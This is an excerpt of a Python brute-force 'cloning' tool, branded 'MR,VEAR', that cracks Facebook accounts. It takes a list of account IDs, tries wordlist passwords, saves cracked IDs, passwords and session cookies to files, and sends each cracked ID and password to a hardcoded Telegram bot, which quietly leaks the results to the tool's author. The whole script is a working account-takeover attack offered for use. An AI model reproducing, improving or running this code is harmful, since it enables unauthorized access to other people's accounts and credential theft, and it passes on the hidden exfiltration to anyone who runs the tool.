...
console = Console()
sys.stdout.write('\x1b]2; BAXHER BEN BO DYARXHOSHNAW TOOL VIP\x07')
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
...
1;91mCODAKAN: BY VEAR
My user: MR,VEAR
1;96mFile clonig/ID Public:1;92mACTIV
CHANAL:1;91mNOT
1;91mTeam:1;91mNOT
1;92mVersion :1;92m4.01
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print('[1] CRA PUPLIC/MULITY \033[33m[ \033[32mON \033[33m ] ')
	print('')
	print('[2] CRACK WITH FILE \033[33m[ \033[32mON \033[33m ] ')
	print('')
	print('\x1b[1;92m[03] CHECK CRACK \033[32mON/\033[33mCP \033[33m[ \033[32mON \033[33m ] ')
	print('')
	print('[0] LOG OUT')
	print('')
	...
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['']:
		error()
		...
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSukses Logout\x1b[1;93m+\x1b[1;92mDelleted Cukis ')
		exit()
	else:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mCheck Cracked Checkpoint \33[m(\x1b[1;93mCP\33[m) \x1b[1;92mAccount ')
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;91mCheck Cracked OK \33[m(\x1b[1;92mOK\33[m) \x1b[1;91mAccount ')
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;91mExit	')
	kz = input('\n\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mChoice > \x1b[1;93m')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mFile Not Found ! ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mCracked CP ☟☟☟ ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			try:geh = lol[geeh]
				...
				print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mYour Choice Is To Big ')
				exit()
			...
			for cpku in range(len(lin)):
				...
				cpkuh=f'# ID : {cpkuni[0]} PASS : {cpkuni[1]}'
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mCracked OK ☟☟☟ ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('[ ➣_ ] HOW MUCH IDS FOR CRACK ? ➤ '))
	except ValueError:
	...
	for userr in uid:
		try:
			...
			back()
	try:
		print(f'\n[ ➣_ ] \x1b[1;93mALL ID : \x1b[1;92m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' \x1b[1;91mCHOICE NUMBER ')
		back()
	except (KeyError,IOError):
		print(f' \x1b[1;93mID NOT PUBLIC {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} FULL CLONING HAS BEEN STARTED {m}•{k}•{h}•{x} <<<<< ')
	print('')
	os.system('clear');banner()
	print(f'------------------------------------------------------')
	print(f'\033[1;97m[\033[1;32m+\033[1;97m] TOTAL IDS =  \x1b[1;92m'+str(len(id)))
	print(f'\033[1;97m[\033[1;32m+\033[1;97m] CLONING HAS STARTING')
	print(f'\033[1;97m[\033[1;32m+\033[1;97m] PROCESSING')
	print(f'\033[1;97m[\033[1;32m+\033[1;97m] TOOL PRCI [VIP]')	
	print(f'------------------------------------------------------')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \r[ MR,VEAR ] {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[+] MR,VEAR-CP {idf} {K}[+] CP {pw}')     
				...
				print(f'\r\x1b[32m[+] MR,VEAR-OK {idf}  | {pw}  | {kuki}')
				requests.get(f"https://api.telegram.org/bot5516273454:AAHD3v8ba2QPmlqsbIpppcmY0hyJLnvOgMU/sendMessage?chat_id=5760025261&text=DYAR-OK  {idf} | {pw} ")				
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ MR,VEAR ]     {P}{b}{loop}{P}  /  {b}{len(id)}{P}  -  OK - {P}{H}{ok}{P}  -  CP -{P}{M}{cp}{P}  -  ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
    ...
    'viewport-width': '980',}
			...
			if "MR,VEAR checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} MR,VEAR-OK {idf}  |  PASS : {pw} | {N}')
				requests.get(f"https://api.telegram.org/bot5516273454:AAHD3v8ba2QPmlqsbIpppcmY0hyJLnvOgMU/sendMessage?chat_id=5760025261&text=DYAR-OK  {idf}  |  {pw} ")
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\MR,VEAR¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
    ...
    'viewport-width': '980',}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[YAA] ID       : {idf} [MR,VEAR] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='MR,VEAR-XD CP'))
					open('/sdcard/MR,VEAR-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/MR,VEAR-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[MR,VEAR ok] ID       : {idf}\n[MR,VEAR ok] PASSWORD : {pw}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='MR,VEAR-XD OK'))
					ok+=1
					break
					...
					print('\n')
					statusok = f'[bold green][ MR,VEAR OK ] ID       : {idf}\n[ MR,VEAR OK ] PASSWORD : {pw}\n[ MR,VEAR OK ][/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MR,VEAR-XD OK[/bold green]'))
					ok+=1
					break
